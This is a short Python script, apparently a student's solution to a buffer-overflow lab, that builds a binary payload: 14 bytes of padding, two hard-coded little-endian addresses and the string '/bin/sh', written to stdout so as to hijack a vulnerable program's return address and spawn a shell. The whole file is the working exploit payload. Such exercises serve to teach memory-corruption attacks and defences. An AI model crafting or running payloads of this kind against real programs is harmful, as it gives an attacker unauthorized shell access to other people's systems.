#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'a'*14+pack("<II", 0x080488ad, 0xfffef5d8)+b'/bin/sh')